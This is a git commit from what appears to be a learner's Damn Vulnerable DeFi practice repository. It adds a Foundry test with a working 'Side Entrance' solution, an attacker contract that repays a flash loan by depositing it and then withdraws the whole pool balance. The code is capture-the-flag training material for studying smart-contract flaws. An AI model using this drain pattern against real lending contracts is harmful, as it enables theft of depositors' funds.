dbb6c91585838feecc4bee2edc86f5e8738c3694
BLOCK-PROGRAMR <0xscater@gmail.com>
2025-05-19 14:37:54 +0530

    changes

---
+++ Dam-vulnerable-Defi/notes.md
@@ -0,0 +1,1 @@
+``` $wc -l src/unstoppable/UnstoppableMonitor.sol ``` -- this command is used to find the no of lines in the contract
---
+++ Dam-vulnerable-Defi/test/side-entrance/SideEntrance.t.sol
@@ -0,0 +1,90 @@
+// SPDX-License-Identifier: MIT
+// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
+pragma solidity =0.8.25;
+
+import {Test, console} from "forge-std/Test.sol";
+import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
+
+contract SideEntranceChallenge is Test {
+    address deployer = makeAddr("deployer");
+    address player = makeAddr("player");
+    address recovery = makeAddr("recovery");
+
+    uint256 constant ETHER_IN_POOL = 1000e18;
+    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
+
+    SideEntranceLenderPool pool;
+
+    modifier checkSolvedByPlayer() {
+        vm.startPrank(player, player);
+        _;
+        vm.stopPrank();
+        _isSolved();
+    }
+
+    /**
+     * SETS UP CHALLENGE - DO NOT TOUCH
+     */
+    function setUp() public {
+        startHoax(deployer);
+        pool = new SideEntranceLenderPool();
+        pool.deposit{value: ETHER_IN_POOL}();
+        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+    }
+
+    /**
+     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
+     */
+    function test_assertInitialState() public view {
+        assertEq(address(pool).balance, ETHER_IN_POOL);
+        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
+    }
+
+    /**
+     * CODE YOUR SOLUTION HERE
+     */
+    function test_sideEntrance() public checkSolvedByPlayer {
+        SideAttranceAttack attack = new SideAttranceAttack(
+            address(pool),
+            recovery
+        );
+        attack.Attack();
+    }
+
+    /**
+     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
+     */
+    function _isSolved() private view {
+        assertEq(address(pool).balance, 0, "Pool still has ETH");
+        assertEq(
+            recovery.balance,
+            ETHER_IN_POOL,
+            "Not enough ETH in recovery account"
+        );
+    }
+}
+
+contract SideAttranceAttack {
+    address public pool;
+    address public recovery;
+
+    constructor(address _pool, address _recovery) {
+        pool = _pool;
+        recovery = _recovery;
+    }
+
+    function Attack() external {
+        SideEntranceLenderPool(pool).flashLoan(address(pool).balance); //borrower asking all the ether in the pool
+        SideEntranceLenderPool(pool).withdraw(); //after the flashLoan,withdraw all the ether in the pool
+    }
+
+    //pool paying the ether to the attacker for flashLoan and attacker paying the ether to the pool for withdraw with in the same transation
+    function execute() external payable {
+        SideEntranceLenderPool(pool).deposit{value: msg.value}();
+    }
+
+    receive() external payable {
+        payable(recovery).transfer(msg.value);
+    }
+}
